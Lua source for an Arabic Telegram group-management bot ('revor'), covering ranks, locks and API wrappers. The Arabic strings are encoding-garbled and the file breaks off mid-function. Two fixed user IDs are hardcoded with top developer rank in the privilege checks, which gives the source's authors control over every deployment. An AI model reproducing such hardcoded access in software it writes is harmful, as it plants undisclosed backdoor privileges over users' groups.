--[[

--]]
database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
serpent = dofile("./File_Libs/serpent.lua")
JSON = dofile("./File_Libs/dkjson.lua")
json = dofile("./File_Libs/JSON.lua")
URL = dofile("./File_Libs/url.lua")
http = require("socket.http")
https = require("ssl.https")
sudos = dofile("sudo.lua")
bot_id = token:match("(%d+)") 
Id_Sudo = Sudo
List_Sudos = {Id_Sudo,1890819157,1593178008}
print([[

 # _____ ________ ______ _____ 
# | __ \| ____\ \ / / __ \| __ \ 
# | |__) | |__ \ \ / / | | | |__) |
# | _ /| __| \ \/ /| | | | _ / 
# | | \ \| |____ \ / | |__| | | \ \ 
# |_| \_\______| \/ \____/|_| \_\

# source revor ππ source revor @REVORB0T
# πππππΎπ π½π @U660P - @MahmoudM2


]])
print("\27[34m"..[[

# source revor ππ source revor @REVORB0T
# πππππΎπ π½π @U660P - @MahmoudM2
]].."\27[m")

io.popen("mkdir -p Tshake_Files")
t = "\27[35m".."\nAll Files Started : \n____________________\n"..'\27[m'
i = 0
for v in io.popen('ls Tshake_Files'):lines() do
if v:match(".lua$") then
i = i + 1
t = t.."\27[39m"..i.."\27[36m".." - \27[10;32m"..v..",\27[m \n"
end
end
print(t)
function vardump(value) 
print(serpent.block(value, {comment=false})) 
end 
function dl_cb(t,s)
end
function DevSonic(msg) 
local mahmoud_Sudo = false 
for k,v in pairs(List_Sudos) do 
if msg.sender_user_id_ == v then 
mahmoud_Sudo = true 
end 
end 
return mahmoud_Sudo 
end 
function DevSonice(user) 
local mahmoud_Sudo = false 
for k,v in pairs(List_Sudos) do 
if user == v then 
mahmoud_Sudo = true 
end 
end 
return mahmoud_Sudo 
end 
function DevBot(msg) 
local hash = database:sismember(bot_id.."Sudo:User", msg.sender_user_id_) 
if hash or DevSonic(msg) or Devss(msg) then 
return true 
else 
return false 
end 
end
function Devss(msg) 
local hash = database:sismember(bot_id.."DEV:Sudo:T", msg.sender_user_id_) 
if hash or DevSonic(msg) then 
return true 
else 
return false 
end 
end
function OwnerSs(msg)
local hash = database:sismember(bot_id.."Basic:Creator23"..msg.chat_id_, msg.sender_user_id_) 
if hash or DevSonic(msg) or Devss(msg) or DevBot(msg) then 
return true 
else 
return false 
end 
end

function SupCreator(msg)
local hash = database:sismember(bot_id.."Basic:Creator"..msg.chat_id_, msg.sender_user_id_) 
if hash or DevSonic(msg) or DevBot(msg) or Devss(msg) or OwnerSs(msg) then 
return true 
else 
return false 
end 
end
function Mangerall(msg)
local hash = database:sismember(bot_id.."manger:all", msg.sender_user_id_) 
if hash or DevSonic(msg) or DevBot(msg) or Devss(msg) or OwnerSs(msg) or SupCreator(msg) or Creator(msg) then 
return true 
else 
return false 
end 
end
function Vipall(msg) 
local hash = database:sismember(bot_id.."Vip:all", msg.sender_user_id_) 
if hash or DevSonic(msg) or DevBot(msg) or Devss(msg) or OwnerSs(msg) or SupCreator(msg) or Creator(msg) or Manger(msg) or Mangerall(msg) then 
return true 
else 
return false 
end 
end
function Creator(msg)
local hash = database:sismember(bot_id.."Creator"..msg.chat_id_, msg.sender_user_id_) 
if hash or DevSonic(msg) or DevBot(msg) or Devss(msg) or OwnerSs(msg) or SupCreator(msg) then 
return true 
else 
return false 
end 
end
function Manger(msg)
local hash = database:sismember(bot_id.."Manager"..msg.chat_id_,msg.sender_user_id_) 
if hash or DevSonic(msg) or DevBot(msg) or Devss(msg) or OwnerSs(msg) or SupCreator(msg) or Creator(msg) or Mangerall(msg) then 
return true 
else 
return false 
end 
end
function Admin(msg)
local hash = database:sismember(bot_id.."Mod:User"..msg.chat_id_,msg.sender_user_id_) 
if hash or DevSonic(msg) or DevBot(msg) or Devss(msg) or OwnerSs(msg) or SupCreator(msg) or Creator(msg) or Mangerall(msg) or Manger(msg) then 
return true 
else 
return false 
end 
end
function Special(msg)
local hash = database:sismember(bot_id.."Special:User"..msg.chat_id_,msg.sender_user_id_) 
if hash or DevSonic(msg) or DevBot(msg) or Devss(msg) or OwnerSs(msg) or SupCreator(msg) or Creator(msg) or Manger(msg) or Admin(msg) or Vipall(msg) or Mangerall(msg) then 
return true 
else 
return false 
end 
end

function Rank_Checking(user_id,chat_id)
if tonumber(user_id) == tonumber(Id_Sudo) then
var = true 
elseif tonumber(user_id) == tonumber(bot_id) then 
var = true 
elseif tonumber(user_id) == tonumber(1593178008) then
var = true 
elseif tonumber(user_id) == tonumber(1890819157) then
var = true 
elseif database:sismember(bot_id.."Sudo:User", user_id) then
var = true 
elseif database:sismember(bot_id.."DEV:Sudo:T", user_id) then
var = true 
elseif database:sismember(bot_id.."Basic:Creator23"..chat_id, user_id) then
var = true
elseif database:sismember(bot_id.."Basic:Creator"..chat_id, user_id) then
var = true
elseif database:sismember(bot_id.."Creator"..chat_id, user_id) then
var = true 
elseif database:sismember(bot_id.."manger:all", user_id) then
var = true 
elseif database:sismember(bot_id.."Manager"..chat_id, user_id) then
var = true 
elseif database:sismember(bot_id.."Mod:User"..chat_id, user_id) then
var = true 
elseif database:sismember(bot_id.."Vip:all", user_id) then
var = true 
elseif database:sismember(bot_id.."Special:User"..chat_id, user_id) then 
var = true 
else 
var = false 
end 
return var
end 
function Get_Info(msg,chat,user)
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. msg.chat_id_ ..'&user_id='..user..'')
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.ok == true then
if Json_Info.result.status == "creator" then
send(msg.chat_id_,msg.id_,'\n- Ψ§ΩΩΨ§ΩΩ')   
return false  end 
if Json_Info.result.status == "member" then
send(msg.chat_id_,msg.id_,'\n- ΩΨ¬Ψ±Ψ― ΨΉΨΆΩ ΩΩΨ§ ')   
return false  end
if Json_Info.result.status == 'left' then
send(msg.chat_id_,msg.id_,'\n- Ψ§ΩΨ΄Ψ?Ψ΅ ΨΊΩΨ± ΩΩΨ¬ΩΨ― ΩΩΨ§ ')   
return false  end
if Json_Info.result.status == "administrator" then
if Json_Info.result.can_change_info == true then
info = 'κͺ'
else
info = 'β'
end
if Json_Info.result.can_delete_messages == true then
delete = 'κͺ'
else
delete = 'β'
end
if Json_Info.result.can_invite_users == true then
invite = 'κͺ'
else
invite = 'β'
end
if Json_Info.result.can_pin_messages == true then
pin = 'κͺ'
else
pin = 'β'
end
if Json_Info.result.can_restrict_members == true then
restrict = 'κͺ'
else
restrict = 'β'
end
if Json_Info.result.can_promote_members == true then
promote = 'κͺ'
else
promote = 'β'
end
send(chat,msg.id_,'\n- Ψ§ΩΨ±ΨͺΨ¨Ψ© : ΩΨ΄Ψ±Ω  '..'\n- ΩΨ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ ΩΩ β \nΩ΄ββββββββββ'..'\n- ΨͺΨΊΩΨ± ΩΨΉΩΩΩΨ§Ψͺ Ψ§ΩΩΨ¬ΩΩΨΉΩ β β΄ '..info..' β΅'..'\n- Ψ­Ψ°Ω Ψ§ΩΨ±Ψ³Ψ§Ψ¦Ω β β΄ '..delete..' β΅'..'\n- Ψ­ΨΈΨ± Ψ§ΩΩΨ³ΨͺΨ?Ψ―ΩΩΩ β β΄ '..restrict..' β΅'..'\n- Ψ―ΨΉΩΨ© ΩΨ³ΨͺΨ?Ψ―ΩΩΩ β β΄ '..invite..' β΅'..'\n- ΨͺΨ«Ψ¨ΩΨͺ Ψ§ΩΨ±Ψ³Ψ§Ψ¦Ω β β΄ '..pin..' β΅'..'\n- Ψ§ΨΆΨ§ΩΨ© ΩΨ΄Ψ±ΩΩΩ Ψ¬Ψ―Ψ― β β΄ '..promote..' β΅')   
end
end
end
function Get_Rank(user_id,chat_id)
if tonumber(user_id) == tonumber(1593178008) then 
var = "ΩΨ·ΩΨ± Ψ§ΩΨ³ΩΨ±Ψ³"
elseif tonumber(user_id) == tonumber(1890819157) then 
var = "ΩΨ·ΩΨ± Ψ§ΩΨ³ΩΨ±Ψ³"
elseif DevSonice(user_id) == true then
var = "Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω" 
elseif tonumber(user_id) == tonumber(bot_id) then 
var = "Ψ§ΩΨ¨ΩΨͺ"
elseif database:sismember(bot_id.."DEV:Sudo:T", user_id) then 
var = "Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΒ²" 
elseif database:sismember(bot_id.."Sudo:User", user_id) then
var = database:get(bot_id.."Sudo:Rd"..chat_id) or "Ψ§ΩΩΨ·ΩΨ±" 
elseif database:sismember(bot_id.."Basic:Creator23"..chat_id, user_id) then
var = "Ψ§ΩΩΨ§ΩΩ"
elseif database:sismember(bot_id.."Basic:Creator"..chat_id, user_id) then
var = database:get(bot_id.."SupCreator:Rd"..chat_id) or "Ψ§ΩΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω"
elseif database:sismember(bot_id.."Creator"..chat_id, user_id) then
var = database:get(bot_id.."Creator:Rd"..chat_id) or "Ψ§ΩΩΩΨ΄Ψ¦" 
elseif database:sismember(bot_id.."manger:all", user_id) then
var = "Ψ§ΩΩΨ―ΩΨ± Ψ§ΩΨΉΨ§Ω"
elseif database:sismember(bot_id.."Manager"..chat_id, user_id) then
var = database:get(bot_id.."Manager:Rd"..chat_id) or "Ψ§ΩΩΨ―ΩΨ±" 
elseif database:sismember(bot_id.."Mod:User"..chat_id, user_id) then
var = database:get(bot_id.."Mod:Rd"..chat_id) or "Ψ§ΩΨ§Ψ―ΩΩ" 
elseif database:sismember(bot_id.."Vip:all", user_id) then
var = "Ψ§ΩΩΩΩΨ² Ψ§ΩΨΉΨ§Ω"
elseif database:sismember(bot_id.."Special:User"..chat_id, user_id) then 
var = database:get(bot_id.."Special:Rd"..chat_id) or "Ψ§ΩΩΩΩΨ²" 
else 
var = database:get(bot_id.."Memp:Rd"..chat_id) or "Ψ§ΩΨΉΨΆΩ"
end 
return var
end 
function ChekAdd(chat_id)
if database:sismember(bot_id.."Chek:Groups",chat_id) then
var = true
else 
var = false
end
return var
end
function Muted_Groups(Chat_id,User_id) 
if database:sismember(bot_id.."Muted:User"..Chat_id,User_id) then
Var = true
else
Var = false
end
return Var
end
function Ban_Groups(Chat_id,User_id) 
if database:sismember(bot_id.."Ban:User"..Chat_id,User_id) then
Var = true
else
Var = false
end
return Var
end 
function Ban_All_Groups(User_id) 
if database:sismember(bot_id.."GBan:User",User_id) then
Var = true
else
Var = false
end
return Var
end
function Gmute_User(User_id) 
if database:sismember(bot_id..'Gmute:User',User_id) then
Var = true
else
Var = false
end
return Var
end
function getbio(User)
local var = "ΩΨ§ΩΩΨ¬Ψ―"
local url , res = https.request("https://api.telegram.org/bot"..token.."/getchat?chat_id="..User);
data = json:decode(url)
if data.result.bio then
var = data.result.bio
end
return var
end
function send_inlin_key(chat_id,text,inline,reply_id) 
local keyboard = {} 
keyboard.inline_keyboard = inline 
local send_api = "https://api.telegram.org/bot"..token.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(keyboard)) 
if reply_id then 
local msg_id = reply_id/2097152/0.5
send_api = send_api.."&reply_to_message_id="..msg_id 
end 
return s_api(send_api) 
end
function from_username(msg)
function gfrom_user(extra,result,success)
if result.username_ then
F = result.username_
else
F = 'nil'
end
return F
end
local username = getUser(msg.sender_user_id_,gfrom_user)
return username
end
function getUser(user_id, cb)
tdcli_function ({
ID = "GetUser",
user_id_ = user_id
}, cb, nil)
end
function getUserFull(user_id,cb)
tdcli_function ({
ID = "GetUserFull",
user_id_ = user_id
}, cb, nil)
end
function send(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil)
end
function sendMsg(chat_id,reply_id,text,markup,funcb)
pcall(tdcli_function({
ID="SendMessage",
chat_id_=chat_id,
reply_to_message_id_= reply_id,
disable_notification_=1,
from_background_= 1,
reply_markup_= nil,
input_message_content_={
ID = "InputMessageText",
text_= text,
disable_web_page_preview_= 1,
clear_draft_= 0,
entities_={},
parse_mode_=  {ID = "TextParseModeMarkdown"} ,
}},funcb or dl_cb,nil)
)
end
function send(chat_id, reply_to_message_id, text)
local text1 = database:get(bot_id..'NightRang:new:sourse1') or 'β β β β β β β β'
local text2 = database:get(bot_id..'NightRang:new:sourse2') or 'Ω­'
text = string.gsub(text,"β β β β β β β β",text1)
text = string.gsub(text,"Ω­",text2)
local TextParseMode = {ID = "TextParseModeMarkdown"}
pcall(tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil))
end
function send1(chat_id, reply_to_message_id, text)
local text1 = database:get(bot_id..'NightRang:new:sourse1') or 'β β β β β β β β'
local text2 = database:get(bot_id..'NightRang:new:sourse2') or 'Ω­'
text = string.gsub(text,"β β β β β β β β",text1)
text = string.gsub(text,"Ω­",text2)
local TextParseMode = {ID = "TextParseModeMarkdown"}
pcall(tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 0,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil))
end
function send2(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
pcall(tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 0,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil))
end
function DeleteMessage(chat,id)
tdcli_function ({
ID="DeleteMessages",
chat_id_=chat,
message_ids_=id
},function(arg,data) 
end,nil)
end
function DeleteMessage_(chat,id,func)
tdcli_function ({
ID="DeleteMessages",
chat_id_=chat,
message_ids_=id
},func or dl_cb,nil)
end
function getInputFile(file) 
if file:match("/") then 
infile = {ID = "InputFileLocal", 
path_ = file} 
elseif file:match("^%d+$") then 
infile = {ID = "InputFileId", 
id_ = file} 
else infile = {ID = "InputFilePersistentId", 
persistent_id_ = file} 
end 
return infile 
end
function RestrictChat(User_id,Chat_id)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..Chat_id.."&user_id="..User_id)
end

function sendin(chat,msgid,user,user_id)
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. chat ..'&user_id='.. user_id)
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
info = 'κͺ' 
infoo = 'false' 
else 
info = 'β' 
infoo = 'true' 
end
if Json_Info.result.can_delete_messages == true then
delete = 'κͺ' 
deletee = 'false' 
else 
delete = 'β' 
deletee = 'true' 
end
if Json_Info.result.can_invite_users == true then
invite = 'κͺ' 
invitee = 'false' 
else 
invite = 'β' 
invitee = 'true' 
end
if Json_Info.result.can_pin_messages == true then
pin = 'κͺ' 
pinn = 'false' 
else 
pin = 'β' 
pinn = 'true' 
end
if Json_Info.result.can_restrict_members == true then
restrict = 'κͺ' 
restrictt = 'false' 
else 
restrict = 'β' 
restrictt = 'true' 
end
if Json_Info.result.can_promote_members == true then
promote = 'κͺ' 
promotee = 'false' 
else 
promote = 'β' 
promotee = 'true' 
end 
if Json_Info.result.can_manage_voice_chats == true then
voice = 'κͺ' 
voicee = 'false' 
else 
voice = 'β' 
voicee = 'true' 
end
if Json_Info.result.can_manage_chat == true then
manage = 'κͺ' 
managee = 'false' 
else 
manage = 'β' 
managee = 'true' 
end

keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'ΨͺΨΊΩΩΨ± Ψ§ΩΩΨΉΩΩΩΨ§Ψͺ '..info, callback_data='amr@'..user..'/user@'..user_id.."/chenginfo"..infoo},
},
{
{text = 'Ψ­Ψ°Ω Ψ§ΩΨ±Ψ³Ψ§Ψ¦Ω '..delete, callback_data='amr@'..user..'/user@'..user_id.."/delmsgg"..deletee},
},
{
{text = 'Ψ­ΨΈΨ± Ψ§ΩΩΨ³ΨͺΨ?Ψ―ΩΩΩ '..restrict, callback_data='amr@'..user..'/user@'..user_id.."/banuser"..restrictt},
},
{
{text = 'Ψ§ΨΆΨ§ΩΩ ΩΨ³ΨͺΨ?Ψ―ΩΩΩ '..invite, callback_data='amr@'..user..'/user@'..user_id.."/addlink"..invitee},
},
{
{text = 'ΨͺΨ«Ψ¨ΩΨͺ Ψ§ΩΨ±Ψ³Ψ§Ψ¦Ω '..pin, callback_data='amr@'..user..'/user@'..user_id.."/pinmsg"..pinn},
},
{
{text = 'Ψ§Ψ―Ψ§Ψ±Ω Ψ§ΩΩΩΨ§ΩΩΨ§Ψͺ '..voice, callback_data='amr@'..user..'/user@'..user_id.."/voice"..voicee},
},
{
{text = 'Ψ§ΩΨ¨ΩΨ§Ψ‘ ΩΨͺΨ?ΩΩ '..manage, callback_data='amr@'..user..'/user@'..user_id.."/manage"..managee},
},
{
{text = 'Ψ§ΨΆΨ§ΩΩ ΩΨ΄Ψ±ΩΩΩ '..promote, callback_data='amr@'..user..'/user@'..user_id.."/addadmin"..promotee},
},
}
local Texti = 'ΨͺΩ ΨͺΨΉΨ―ΩΩ Ψ΅ΩΨ§Ψ­ΩΨ§ΨͺΩ'
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..chat..'&text='..URL.escape(Texti)..'&message_id='..msgid..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end



function s_api(web) 
local info, res = https.request(web) 
local req = json:decode(info) 
if res ~= 200 then 
return false 
end 
if not req.ok then 
return false end 
return req 
end 
function sendText(chat_id, text, reply_to_message_id, markdown) 
send_api = "https://api.telegram.org/bot"..token 
local url = send_api.."/sendMessage?chat_id=" .. chat_id .. "&text=" .. URL.escape(text) 
if reply_to_message_id ~= 0 then 
url = url .. "&reply_to_message_id=" .. reply_to_message_id 
end 
if markdown == "md" or markdown == "markdown" then 
url = url.."&parse_mode=Markdown" 
elseif markdown == "html" then 
url = url.."&parse_mode=HTML" 
end 
return s_api(url) 
end
function mahmoudr(chat_id, reply_to_message_id, audio, caption, markdown) 
send_api = "https://api.telegram.org/bot"..token 
local url = send_api.."/sendAudio?chat_id=" .. chat_id .. "&audio=" .. audio .."&caption=" .. URL.escape(caption) 
if reply_to_message_id ~= 0 then 
reply_to_message_id_ = reply_to_message_id
url = url .. "&reply_to_message_id=" .. reply_to_message_id_ .."&parse_mode=Markdown" 
end 
return s_api(url) 
end
function send_inline_key(chat_id,text,keyboard,inline,reply_id) 
local response = {} 
response.keyboard = keyboard 
response.inline_keyboard = inline 
response.resize_keyboard = true 
response.one_time_keyboard = false 
response.selective = false 
local send_api = "https://api.telegram.org/bot"..token.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) 
if reply_id then 
send_api = send_api.."&reply_to_message_id="..reply_id 
end 
return s_api(send_api) 
end
function send_inline_Media(chat_id,iny,x,cx,inline,reply_id) 
local keyboard = {} 
keyboard.inline_keyboard = inline 
local send_api = "https://api.telegram.org/bot"..token.."/"..iny.."?chat_id="..chat_id.."&"..x.."="..cx.."&reply_markup="..URL.escape(JSON.encode(keyboard)) 
if reply_id then 
local msg_id = reply_id/2097152/0.5
send_api = send_api.."&reply_to_message_id="..msg_id 
end 
return s_api(send_api) 
end
function GetInputFile(file) 
local file = file or "" 
if file:match("/") then 
infile = {ID= "InputFileLocal", path_ = file} 
elseif file:match("^%d+$") then 
infile ={ID="InputFileId",id_=file} 
else infile={ID="InputFilePersistentId",persistent_id_ = file} 
end 
return infile 
end
function sendPhoto(chat_id,reply_id,photo,caption,func)
tdcli_function({
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessagePhoto",
photo_ = GetInputFile(photo),
added_sticker_file_ids_ = {},
width_ = 0,
height_ = 0,
caption_ = caption or ""
}
},func or dl_cb,nil)
end
	
function sendVoice(chat_id,reply_id,voice,caption,func)
tdcli_function({
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessageVoice",
voice_ = GetInputFile(voice),
duration_ = "",
waveform_ = "",
caption_ = caption or ""
}},func or dl_cb,nil)
end

function sendAnimation(chat_id,reply_id,animation,caption,func)
tdcli_function({
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessageAnimation",
animation_ = GetInputFile(animation),
width_ = 0,
height_ = 0,
caption_ = caption or ""
}},func or dl_cb,nil)
end

function sendAudio(chat_id,reply_id,audio,title,caption,func)
tdcli_function({
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessageAudio",
audio_ = GetInputFile(audio),
duration_ = "",
title_ = title or "",
performer_ = "",
caption_ = caption or ""
}},func or dl_cb,nil)
end

function sendSticker(chat_id,reply_id,sticker,func)
tdcli_function({
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessageSticker",
sticker_ = GetInputFile(sticker),
width_ = 0,
height_ = 0
}},func or dl_cb,nil)
end

function sendVideo(chat_id,reply_id,video,caption,func)
tdcli_function({ 
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 0,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessageVideo", 
video_ = GetInputFile(video),
added_sticker_file_ids_ = {},
duration_ = 0,
width_ = 0,
height_ = 0,
caption_ = caption or ""
}},func or dl_cb,nil)
end


function sendDocument(chat_id,reply_id,document,caption,func)
tdcli_function({
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessageDocument",
document_ = GetInputFile(document),
caption_ = caption
}},func or dl_cb,nil)
end
function Kick_Group(chat,user)
tdcli_function ({
ID = "ChangeChatMemberStatus",
chat_id_ = chat,
user_id_ = user,
status_ = {ID = "ChatMemberStatusKicked"},},function(arg,data) end,nil)
end
function addgroup(chat_id) 
database:sadd("mahmoud:addg"..bot_id,chat_id) 
database:set(bot_id.."bot:enable:"..chat_id, true) 
database:sadd(bot_id..'bot:groups',chat_id)
end 
function remgroup(chat_id) 
database:srem("mahmoud:addg"..bot_id,chat_id) 
database:del(bot_id.."bot:enable:"..chat_id, true)  database:srem(bot_id..'bot:groups',chat_id)
end
local function remlockal(chat_id)
database:del(bot_id..'editmsg'..chat_id) database:del(bot_id..'bot:cmds'..chat_id) database:del(bot_id..'bot:bots:mute'..chat_id) database:del(bot_id..'bot:bots:ban'..chat_id) database:del(bot_id..'keed_bots'..chat_id) database:del(bot_id..'anti-flood:'..chat_id) database:del(bot_id..'bot:pin:mute'..chat_id) database:del(bot_id..'bot:photo:mute'..chat_id) database:del(bot_id..'bot:spam:mute'..chat_id) database:del(bot_id..'bot:video:mute'..chat_id) database:del(bot_id..'bot:document:mute'..chat_id) database:del(bot_id..'bot:inline:mute'..chat_id) database:del(bot_id..'markdown:lock'..chat_id) database:del(bot_id..'bot:gifs:mute'..chat_id) database:del(bot_id..'bot:music:mute'..chat_id) database:del(bot_id..'bot:voice:mute'..chat_id) database:del(bot_id..'bot:links:mute'..chat_id) database:del(bot_id..'bot:location:mute'..chat_id) database:del(bot_id..'tags:lock'..chat_id) database:del(bot_id..'bot:strict'..chat_id) database:del(bot_id..'bot:hashtag:mute'..chat_id) database:del(bot_id..'bot:contact:mute'..chat_id) database:del(bot_id..'bot:webpage:mute'..chat_id) database:del(bot_id..'bot:sticker:mute'..chat_id) database:del(bot_id..'bot:forward:mute'..chat_id)
end
local function addlockal(chat_id)
database:set(bot_id..'editmsg'..chat_id,true) database:set(bot_id..'bot:cmds'..chat_id,true) database:set(bot_id..'bot:bots:mute'..chat_id,true) database:set(bot_id..'bot:bots:ban'..chat_id,true) database:set(bot_id..'keed_bots'..chat_id,true) database:set(bot_id..'anti-flood:'..chat_id,true) database:set(bot_id..'bot:pin:mute'..chat_id,true) database:set(bot_id..'bot:inline:mute'..chat_id,true) database:set(bot_id..'bot:photo:mute'..chat_id,true) database:set(bot_id..'bot:spam:mute'..chat_id,true) database:set(bot_id..'bot:video:mute'..chat_id,true) database:set(bot_id..'bot:gifs:mute'..chat_id,true) database:set(bot_id..'bot:music:mute'..chat_id,true) database:set(bot_id..'bot:voice:mute'..chat_id,true) database:set(bot_id..'bot:links:mute'..chat_id,true) database:set(bot_id..'bot:location:mute'..chat_id,true) database:set(bot_id..'tags:lock'..chat_id,true) database:set(bot_id..'bot:strict'..chat_id,true) database:set(bot_id..'bot:document:mute'..chat_id,true) database:set(bot_id..'bot:hashtag:mute'..chat_id,true) database:set(bot_id..'bot:contact:mute'..chat_id,true) database:set(bot_id..'bot:webpage:mute'..chat_id,true) database:set(bot_id..'bot:sticker:mute'..chat_id,true) database:set(bot_id..'markdown:lock'..chat_id,true) database:set(bot_id..'bot:forward:mute'..chat_id,true)
end

function Reply_Status(msg,user_id,status,text)
tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,data) 
if data.first_name_ ~= false then
local UserName = (data.username_ or "revorb0t")
for Tshake in string.gmatch(data.first_name_, "[^%s]+") do
data.first_name_ = Tshake
end
local NameUser = "Ω­ Ψ¨ΩΨ§Ψ³Ψ·Ω - ["..data.first_name_.."](T.me/"..UserName..")"
local NameUserr = "Ω­ Ψ§ΩΨΉΨΆΩ ~ ["..data.first_name_.."](T.me/"..UserName..")"
if status == "lock" then
send(msg.chat_id_, msg.id_,NameUser.."\n"..text.."\nΩ­ Ψ?Ψ§Ψ΅ΩΨ© - Ψ§ΩΩΨ³Ψ­\n")
return false
end
if status == "lockktm" then
send(msg.chat_id_, msg.id_,NameUser.."\n"..text.."\nΩ­ Ψ?Ψ§Ψ΅ΩΨ© - Ψ§ΩΩΨͺΩ\n")
return false
end
if status == "lockkick" then
send(msg.chat_id_, msg.id_,NameUser.."\n"..text.."\nΩ­ Ψ?Ψ§Ψ΅ΩΨ© - Ψ§ΩΨ·Ψ±Ψ―\n")
return false
end
if status == "lockkid" then
send(msg.chat_id_, msg.id_,NameUser.."\n"..text.."\nΩ­ Ψ?Ψ§Ψ΅ΩΨ© - Ψ§ΩΨͺΩΩΩΨ―\n")
return false
end
if status == "unlock" then
send(msg.chat_id_, msg.id_,NameUser.."\n"..text)
return false
end
if status == "reply" then
send(msg.chat_id_, msg.id_,NameUserr.."\n"..text)
return false
end
if status == "reply_Add" then
send(msg.chat_id_, msg.id_,NameUser.."\n"..text)
return false
end
else
send(msg.chat_id_, msg.id_,"Ω­ Ψ§ΩΨ­Ψ³Ψ§Ψ¨ ΩΨ­Ψ°ΩΩ ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω")
end
end,nil) 
end -- end
function Total_message(msgs) 
local message = '' 
if tonumber(msgs) < 100 then 
message = 'ΨΊΩΨ± ΩΨͺΩΨ§ΨΉΩ' 
elseif tonumber(msgs) < 200 then 
message = 'Ψ¨Ψ―Ω ΩΨͺΨ­Ψ³Ω' 
elseif tonumber(msgs) < 400 then 
message = 'Ψ΄Ψ¨Ω ΩΨͺΩΨ§ΨΉΩ' 
elseif tonumber(msgs) < 700 then 
message = 'ΩΨͺΩΨ§ΨΉΩ' 
elseif tonumber(msgs) < 1200 then 
message = 'ΩΨͺΩΨ§ΨΉΩ ΩΩΩ' 
elseif tonumber(msgs) < 2000 then 
message = 'ΩΨͺΩΨ§ΨΉΩ Ψ¬Ψ―Ψ§' 
elseif tonumber(msgs) < 3500 then 
message = 'Ψ§ΩΩΩ ΨͺΩΨ§ΨΉΩ' 
elseif tonumber(msgs) < 4000 then 
message = 'ΩΨͺΩΨ§ΨΉΩ ΩΨ§Ψ±' 
elseif tonumber(msgs) < 4500 then 
message = 'ΩΩΨ© Ψ§ΩΨͺΩΨ§ΨΉΩ' 
elseif tonumber(msgs) < 5500 then 
message = 'Ψ§ΩΩΩ ΩΨͺΩΨ§ΨΉΩ' 
elseif tonumber(msgs) < 7000 then 
message = 'ΩΩΩ Ψ§ΩΨͺΩΨ§ΨΉΩ' 
elseif tonumber(msgs) < 9500 then 
message = 'Ψ§ΩΨ¨Ψ±ΩΨ·ΩΨ± Ψ§ΩΨͺΩΨ§ΨΉΩ' 
elseif tonumber(msgs) < 10000000000 then 
